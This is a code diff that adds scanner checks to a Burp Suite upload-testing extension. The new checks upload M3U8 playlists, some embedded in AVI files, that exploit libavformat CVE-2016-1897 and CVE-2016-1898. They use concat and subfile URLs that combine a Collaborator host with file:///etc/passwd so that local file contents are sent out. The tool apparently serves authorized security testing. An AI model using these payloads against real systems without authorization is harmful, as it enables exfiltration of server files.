@@ -326,6 +326,8 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             ('', BurpExtender.MARKER_ORIG_EXT, ''),
             ('', '.gs', ''),
             ('', '.eps', ''),
+            ('', '.pdf', ''),
+            ('', '.pdf', 'application/pdf'),
             ('', BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
             ('', '.jpeg', 'image/jpeg'),
             ('', '.png', 'image/png'),
@@ -1762,6 +1764,14 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         if not burp_colab:
             return []
 
+        def _m3u8_issue(payload_desc, detail):
+            return self._create_issue_template(injector.get_brr(), payload_desc, detail, "Firm", "High")
+
+        def _avi_replace(payload):
+            def _builder(_, url):
+                return avi_generator.get_avi_file(None, payload.replace(BurpExtender.MARKER_COLLAB_URL, url))
+            return _builder
+
         # burp collaborator based as described on https://hackerone.com/reports/115857
         basename = self.FILE_START + "AvColab"
         content_m3u8 = "#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\n{}example.mp4\r\n##prevent cache: {}\r\n#EXT-X-ENDLIST".format(BurpExtender.MARKER_COLLAB_URL, str(random.random()))
@@ -1777,6 +1787,34 @@ class BurpExtender(IBurpExtender, IScannerCheck,
 
         colabs = self._send_collaborator(injector, burp_colab, self.AV_TYPES,
                                        basename + "M3u", content_m3u8, issue)
+
+        # Local file exfiltration as described in CVE-2016-1897 and CVE-2016-1898
+        local_file_name = "LibAvFormat Local File Exfiltration"
+        severity = "High"
+        confidence = "Firm"
+        base_detail = "A Burp collaborator interaction was detected when uploading a libavformat payload " \
+                      "that combines a remote URL with a local file reference. This indicates that the server " \
+                      "may be reading local files while processing uploaded HLS content. "
+
+        concat_payload = "#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\n" \
+                         "concat:{}header.m3u8|file:///etc/passwd\r\n" \
+                         "##prevent cache: {}\r\n#EXT-X-ENDLIST".format(BurpExtender.MARKER_COLLAB_URL, str(random.random()))
+        detail = base_detail + "The payload used the concat protocol to combine a collaborator URL with " \
+                 "file:///etc/passwd, matching CVE-2016-1897. NVD describes this as a case where the URL string " \
+                 "contains the first line of a local file. Interactions:<br><br>"
+        issue = _m3u8_issue(local_file_name + " CVE-2016-1897", detail)
+        colabs.extend(self._send_collaborator(injector, burp_colab, self.AV_TYPES,
+                                              basename + "ConcatLfi", concat_payload, issue))
+
+        subfile_payload = "#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\n" \
+                          "concat:{}header.m3u8|subfile,,start,0,end,4096,,:/etc/passwd\r\n" \
+                          "##prevent cache: {}\r\n#EXT-X-ENDLIST".format(BurpExtender.MARKER_COLLAB_URL, str(random.random()))
+        detail = base_detail + "The payload used the subfile protocol to combine a collaborator URL with a " \
+                 "slice of /etc/passwd, matching CVE-2016-1898. NVD describes this as a case where the URL string " \
+                 "contains an arbitrary line of a local file. Interactions:<br><br>"
+        issue = _m3u8_issue(local_file_name + " CVE-2016-1898", detail)
+        colabs.extend(self._send_collaborator(injector, burp_colab, self.AV_TYPES,
+                                              basename + "SubfileLfi", subfile_payload, issue))
 
         # avi file with m3u as described on https://hackerone.com/reports/226756
         # https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g2239eb85ba_0_20
@@ -1797,6 +1835,23 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                                          basename + "AviM3u", content_m3u8, issue, replace=avi_generator.get_avi_file)
 
         colabs.extend(colabs2)
+
+        issue = _m3u8_issue(local_file_name + " CVE-2016-1897", base_detail +
+                            "The payload used the concat protocol inside an AVI-embedded playlist to combine a " \
+                            "collaborator URL with file:///etc/passwd, matching CVE-2016-1897. Interactions:<br><br>")
+        colabs.extend(self._send_collaborator(injector, burp_colab, self.AV_TYPES,
+                                              basename + "AviConcatLfi", "placeholder", issue,
+                                              replace=_avi_replace("concat:" + BurpExtender.MARKER_COLLAB_URL +
+                                                                   "header.m3u8|file:///etc/passwd")))
+
+        issue = _m3u8_issue(local_file_name + " CVE-2016-1898", base_detail +
+                            "The payload used the subfile protocol inside an AVI-embedded playlist to combine a " \
+                            "collaborator URL with a slice of /etc/passwd, matching CVE-2016-1898. Interactions:<br><br>")
+        colabs.extend(self._send_collaborator(injector, burp_colab, self.AV_TYPES,
+                                              basename + "AviSubfileLfi", "placeholder", issue,
+                                              replace=_avi_replace("concat:" + BurpExtender.MARKER_COLLAB_URL +
+                                                                   "header.m3u8|subfile,,start,0,end,4096,,:/etc/passwd")))
+
         return colabs
 
     def _php_rce_params(self, extension, mime, content=""):
